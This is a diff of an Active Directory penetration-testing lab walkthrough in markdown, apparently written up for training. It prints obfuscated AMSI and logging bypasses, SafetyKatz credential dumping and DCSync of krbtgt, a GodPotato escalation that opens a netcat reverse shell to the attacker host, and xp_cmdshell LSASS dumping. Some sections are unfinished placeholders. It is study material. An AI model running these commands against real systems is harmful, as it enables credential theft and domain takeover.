@@ -2140,7 +1989,7 @@ PS C:\Windows\system32>
 ```
 🚀
 
-![sqlserversync | dbserver31](https://custom-icon-badges.demolab.com/badge/sqlserversync-dbserver31-64b5f6?logo=windows11&logoColor=white)
+![sqlserversync | dbserver31 $>](https://custom-icon-badges.demolab.com/badge/sqlserversync-dbserver31%20[%24>]-64b5f6?logo=windows11&logoColor=white)
 
 `$env:username`:
 ```
@@ -2151,29 +2000,44 @@ tech\sqlserversync👤
 ```
 DBSERVER31🖥️
 ```
+
+`whoami /priv`:
+```
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege📑      Impersonate a client after authentication Enabled✅
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+```
 🚩
 
 ---
 
-## Domain Lateral Movement
+### Domain Lateral Movement | Credential Extraction (with SafetyKatz)
 
-### Domain Lateral Movement 2 | Credential Extraction (with ...)
+11) **Credential Extraction for Domain Lateral Movement** (unsuccessful ❌)
 
-![sqlserversync | dbserver31](https://custom-icon-badges.demolab.com/badge/sqlserversync-dbserver31-64b5f6?logo=windows11&logoColor=white)
+Description: Attempted to extract **credentials** from `dbserver31.tech.finance.corp` using **SafetyKatz**, but the operation failed due to insufficient privileges. Since the session was **not running in high integrity**, access to the LSASS process was restricted. This failure highlights the necessity of obtaining elevated privileges before attempting credential extraction.
+
+![sqlserversync | dbserver31 $>](https://custom-icon-badges.demolab.com/badge/sqlserversync-dbserver31%20[%24>]-64b5f6?logo=windows11&logoColor=white)
+
+![HFS - Loader.exe, SafetyKatz.exe](learning_objective_07_hfs_loader_safetykatz.png)
 
 `iex (iwr -UseBasicParsing http://172.16.100.1/sbloggingbypass.txt)`
 
 `iex (iwr -UseBasicParsing http://172.16.100.1/amsibypass.txt)`
 
-![HFS - Loader.exe](learning_objective_07_hfs_loader.png)
-
 `iwr http://172.16.100.1/Loader.exe -OutFile C:\Users\Public\Loader.exe`
 
 `iwr http://172.16.100.1/SafetyKatz.exe -OutFile C:\Users\Public\SafetyKatz.exe`
 
-![HFS -SafetyKatz.exe](learning_objective_07_hfs_safetykatz.png)
-
-`C:\Users\Public\Loader.exe -path C:\Users\Public\SafetyKatz.exe sekurlsa::evasive-keys exit`:
+`C:\Users\Public\Loader.exe -path C:\Users\Public\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"`:
 ```
 [+] Successfully unhooked ETW!
 [+++] NTDLL.DLL IS UNHOOKED!
@@ -2186,20 +2050,13 @@ DBSERVER31🖥️
 ```
 ❌
 
-`whoami /priv`:
-```
-PRIVILEGES INFORMATION
-----------------------
+---
 
-Privilege Name                Description                               State
-============================= ========================================= ========
-SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
-SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
-SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
-SeImpersonatePrivilege        Impersonate a client after authentication Enabled
-SeCreateGlobalPrivilege       Create global objects                     Enabled
-SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
-```
+### Local Privilege Escalation | Token Impersonation Abuse (with GodPotato)
+
+12) **Token Impersonation for ocal Privilege Escalation** (successful ✅)
+
+Description: Leveraged `GodPotato`, a privilege escalation exploit that abuses **Named Pipe Token Impersonation**, to obtain **SYSTEM privileges** on `dbserver31.tech.finance.corp`. A reverse shell was established to maintain access and facilitate further post-exploitation activities.
 
 `Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full\' | Get-ItemPropertyValue -Name Version`:
 ```
@@ -2210,7 +2067,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 
 `iwr http://172.16.100.1/nc64.exe -OutFile C:\Users\Public\nc64.exe`
 
-![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)
+![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)
 
 `C:\AD\Tools\nc64.exe -lvp 1337`:
 ```
@@ -2219,11 +2076,11 @@ listening on [any] 1337 ...
 [...]
 ```
 
-![sqlserversync | dbserver31](https://custom-icon-badges.demolab.com/badge/sqlserversync-dbserver31-64b5f6?logo=windows11&logoColor=white)
+![sqlserversync | dbserver31 $>](https://custom-icon-badges.demolab.com/badge/sqlserversync-dbserver31%20[%24>]-64b5f6?logo=windows11&logoColor=white)
 
 `C:\Users\Public\GodPotato-NET4.exe -cmd "C:\Users\Public\nc64.exe -e C:\Windows\System32\cmd.exe 172.16.100.1 1337"`
 
-![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)
+![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)
 
 ```
 [...]
@@ -2236,9 +2093,51 @@ Microsoft Windows [Version 10.0.17763.2452]
 C:\Windows\system32>
 ```
 
-![system | dbserver31](https://custom-icon-badges.demolab.com/badge/sqlserversync-dbserver31-64b5f6?logo=windows11&logoColor=white)
+![system | dbserver31 #>](https://custom-icon-badges.demolab.com/badge/sqlserversync-dbserver31%20[%23>]-64b5f6?logo=windows11&logoColor=white)
 
-`C:\Users\Public\Loader.exe -Path C:\Users\Public\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"`:
+`$env:username`:
+```
+SYSTEM👤
+```
+
+`$env:computername`:
+```
+DBSERVER31🖥️
+```
+🚩
+
+---
+
+### Domain Lateral Movement | Credential Extraction (with SafetyKatz)
+
+13) **Credential Extraction for Domain Lateral Movement** (successful ✅)
+
+Description: Executed **PowerShell logging and AMSI bypass techniques** to evade detection while performing credential extraction. Extracted **Kerberos keys** of `sqlserversync` and `DBSERVER31$` from **LSASS memory** on `dbserver31.tech.finance.corp`. These credentials will be leveraged for **lateral movement** and further privilege escalation within the domain.
+
+- **Bypassing PowerShell Logging and AMSI for Evasion**
+
+![system | dbserver31 #>](https://custom-icon-badges.demolab.com/badge/sqlserversync-dbserver31%20[%23>]-64b5f6?logo=windows11&logoColor=white)
+
+`powershell`
+
+`$ExecutionContext.SessionState.LanguageMode`:
+```
+FullLanguage
+```
+
+```powershell
+[Reflection.Assembly]::"l`o`AdwIThPa`Rti`AlnamE"(('S'+'ystem'+'.C'+'ore'))."g`E`TTYPE"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der'))."gET`FI`eLd"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance'))."seTVa`l`Ue"([Ref]."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'tw'+'Provid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static'))."gE`Tva`lUe"($null),0)
+```
+
+```powershell
+S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a')) ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
+```
+
+- **Extract Credentials of `sqlserversync` and `DBSERVER31$` from Memory on `dbserver31.tech.finance.corp`**
+
+![system | dbserver31 #>](https://custom-icon-badges.demolab.com/badge/sqlserversync-dbserver31%20[%23>]-64b5f6?logo=windows11&logoColor=white)
+
+`C:\Users\Public\Loader.exe -path C:\Users\Public\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"`:
 ```
 mimikatz(commandline) # sekurlsa::evasive-keys📌
 
@@ -2286,117 +2185,7 @@ SID               : S-1-5-18
 
 [SNIP]
 ```
-
----
-
-### Domain Lateral Movement | ??? + DCSync
-
-``:
-```
-
-```
-
-`klist`:
-```
-Current LogonId is 0:0xa5a8d0
-
-Cached Tickets: (1)
-
-#0>     Client: sqlserversync @ TECH.FINANCE.CORP
-        Server: krbtgt/TECH.FINANCE.CORP @ TECH.FINANCE.CORP
-        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
-        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
-        Start Time: 3/11/2025 16:46:58 (local)
-        End Time:   3/12/2025 2:46:58 (local)
-        Renew Time: 3/18/2025 16:46:58 (local)
-        Session Key Type: AES-256-CTS-HMAC-SHA1-96
-        Cache Flags: 0x1 -> PRIMARY
-        Kdc Called:
-```
-
----
-
-???
-
-![`studentshare` SMB share 1](./assets/screenshots/learning_objective_23_smbshare_1.png)
-
-![`studentshare` SMB share 2](./assets/screenshots/learning_objective_23_smbshare_2.png)
-
-![Enable `Guest` local user 1](./assets/screenshots/learning_objective_23_enable_guest_1.png)
-
-![Enable `Guest` local user 2](./assets/screenshots/learning_objective_23_enable_guest_2.png)
-
-![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)
-
-`hostname`:
-```
-studvm🖥️
-```
-
-`copy C:\AD\Tools\minidumpdotnet.exe \\studvm\studentshare`
-
-`copy C:\AD\Tools\FindLSASSPID.exe \\studvm\studentshare`
-
-![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)
-
-`klist`:
-```
-Current LogonId is 0:0x87a2d7
-
-Cached Tickets: (2)
-
-#0>     Client: databaseagent🎭 @ TECH.FINANCE.CORP🏛️
-        Server: krbtgt📌/TECH.FINANCE.CORP @ TECH.FINANCE.CORP
-        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
-        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
-        Start Time: 3/11/2025 14:53:02 (local)
-        End Time:   3/12/2025 0:53:02 (local)
-        Renew Time: 3/18/2025 14:53:02 (local)
-        Session Key Type: AES-256-CTS-HMAC-SHA1-96
-        Cache Flags: 0x1 -> PRIMARY
-        Kdc Called: TECH-DC
-
-#1>     Client: databaseagent🎭 @ TECH.FINANCE.CORP🏛️
-        Server: ldap📌/tech-dc🖥️.tech.finance.corp @ TECH.FINANCE.CORP
-        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
-        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
-        Start Time: 3/11/2025 14:53:02 (local)
-        End Time:   3/12/2025 0:53:02 (local)
-        Renew Time: 3/18/2025 14:53:02 (local)
-        Session Key Type: AES-256-CTS-HMAC-SHA1-96
-        Cache Flags: 0
-        Kdc Called: tech-dc.tech.finance.corp
-```
-
-`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
-```
-[SNIP]
-```
-
-`Import-Module C:\AD\Tools\PowerUpSQL-master\PowerUpSQL.psd1`
-
-`Get-SQLServerLinkCrawl -Instance 'dbserver31.tech.finance.corp' -Query 'exec master..xp_cmdshell ''\\studvm.tech.finance.corp\studentshare\FindLSASSPID.exe''' -QueryTarget 'dbserver31'`:
-```
-Version     : SQL Server 2019
-Instance    : DBSERVER31
-CustomQuery : {[+] LSASS PID: 664,📌 }
-Sysadmin    : 1
-Path        : {DBSERVER31}
-User        : TECH\databaseagent
-Links       :
-```
-
-`Get-SQLServerLinkCrawl -Instance 'dbserver31.tech.finance.corp' -Query 'SELECT @@version' -QueryTarget 'dbserver31'`:
-```
-[SNIP]
-```
-
-`Get-SQLServerLinkCrawl -Instance 'dbserver31.tech.finance.corp' -Query 'exec master..xp_cmdshell ''\\studvm.tech.finance.corp\studentshare\minidumpdotnet.exe 664 \\studvm.tech.finance.corp\studentshare\monkey422.dmp''' -QueryTarget 'dbserver31'`:
-```
-
-```
-
-???
+🚩
 
 ---
 
@@ -2487,7 +2276,7 @@ Winrs error:Access is denied.
 
 ```
 
-`C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:tech\krbtgt /domain:tech.finance.corp" exit`:
+`C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::dcsync /user:tech\krbtgt /domain:tech.finance.corp" "exit"`:
 ```
 [SNIP]
 
@@ -2553,7 +2342,7 @@ Supplemental Credentials:
 [SNIP]
 ```
 
-`C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:tech\administrator /domain:tech.finance.corp" exit`:
+`C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::dcsync /user:tech\administrator /domain:tech.finance.corp" "exit"`:
 ```
 [SNIP]
 
@@ -2615,8 +2404,6 @@ Supplemental Credentials:
 ```
 
 ---
-
-### Domain Persistence
 
 #### Domain Persistence | Golden Ticket + DCSync
 
@@ -2745,6 +2532,14 @@ Authentication authority asserted identity  Well-known group S-1-18-1           
 TECH\Denied RODC Password Replication Group Alias            S-1-5-21-1325336202-3661212667-302732393-572 Mandatory group, Enabled by default, Enabled group, Local Group
 Mandatory Label\High Mandatory Level        Label            S-1-16-12288
 ```
+
+---
+
+### Domain Lateral Movement | Credential Extraction (with SafetyKatz)
+
+???
+
+Description: ...
 
 `netsh interface portproxy add v4tov4 listenport=1234 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1`
 
